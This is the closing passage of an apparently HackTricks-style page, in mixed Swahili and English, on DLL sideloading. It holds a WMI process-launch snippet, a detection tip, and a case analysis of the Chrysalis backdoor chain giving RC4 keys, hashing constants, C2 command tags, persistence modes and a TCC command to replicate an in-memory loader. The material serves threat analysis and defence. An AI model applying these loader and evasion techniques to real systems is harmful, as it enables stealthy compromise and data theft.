- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe process iliyoundwa na CIM wakati inapopakia DLL iliyo karibu nayo:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Inafanya kazi na binaries zinazopendelea local DLLs (mfano, `intelbq.exe`, `nearby_share.exe`); payload (mfano, Remcos) huendeshwa chini ya jina lililoaminika.

- **Hunting:** Toa onyo/alert kuhusu `forfiles` wakati `/p`, `/m`, na `/c` zinaonekana pamoja; ni nadra nje ya scripts za admin.

## Uchambuzi wa Kesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

A recent Lotus Blossom intrusion ilitumia mnyororo wa update uliothibitishwa kupeleka NSIS-packed dropper ambao uli-stage DLL sideload pamoja na payloads zilizo kabisa kwenye memory.

Tradecraft flow
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huipa sifa ya **HIDDEN**, hunua Bitdefender Submission Wizard iliyorekebishwa `BluetoothService.exe`, `log.dll` hatari, na encrypted blob `BluetoothService`, kisha huanzisha EXE.
- Host EXE inaimport `log.dll` na inaita `LogInit`/`LogWrite`. `LogInit` inammap-load blob; `LogWrite` inaidecrypt kwa stream ya LCG ya custom (constants **0x19660D** / **0x3C6EF35F**, key material ikitokana na hash ya awali), inaandika juu buffer na shellcode ya plaintext, inaondoa temp, na inaruka/kuelekeza kwake.
- Ili kuepuka IAT, loader inatatua APIs kwa kuhash majina ya export kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha dhidi ya salted target hashes.

Main shellcode (Chrysalis)
- Inaidecrypt module kuu kama PE kwa kurudia add/XOR/sub na key `gQ2JR&9;` kwa passes tano, kisha inaload kwa dynamic `Kernel32.dll` → `GetProcAddress` kukamilisha import resolution.
- Inajenga tena strings za majina ya DLL wakati wa runtime kupitia mabadiliko ya bit-rotate/XOR kwa kila tabia, kisha inaload `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Inatumia resolver ya pili inayopita kwenye **PEB → InMemoryOrderModuleList**, inachambua kila export table kwa block za 4-byte kwa Murmur-style mixing, na inarudi kwa `GetProcAddress` tu ikiwa hash haipatikani.

Embedded configuration & C2
- Config iko ndani ya faili iliyodondolewa `BluetoothService` kwa **offset 0x30808** (size **0x980**) na ime-RC4-decrypted kwa key `qwhvb^435h&*7`, ikifichua URL ya C2 na User-Agent.
- Beacons hujenga profile ya host iliyogawanywa kwa dots, huongeza tag `4Q` mbele, kisha hu-RC4-encrypt kwa key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` juu ya HTTPS. Majibu hu-RC4-decrypt na kusambazwa na tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Mode ya utekelezaji imewekwa kwa CLI args: hakuna args = install persistence (service/Run key) inayorejelea `-i`; `-i` inarelaunch self na `-k`; `-k` inaruka install na inaendesha payload.

Alternate loader observed
- Intrusion ile ile iliweka Tiny C Compiler na ikatekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, na `libtcc.dll` pembeni yake. Source ya C iliyotolewa na mwadukuzi iliingiza shellcode, ikaanzishwa na kukimbizwa kwenye memory bila kugusa diski na PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hatua hii ya compile-and-run inayotegemea TCC iliingiza `Wininet.dll` wakati wa utekelezaji na kuvuta shellcode ya awamu ya pili kutoka kwenye URL iliyowekwa moja kwa moja, ikitoa loader yenye kubadilika inayojifanya kuwa utekelezaji wa compiler.

## Marejeo

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
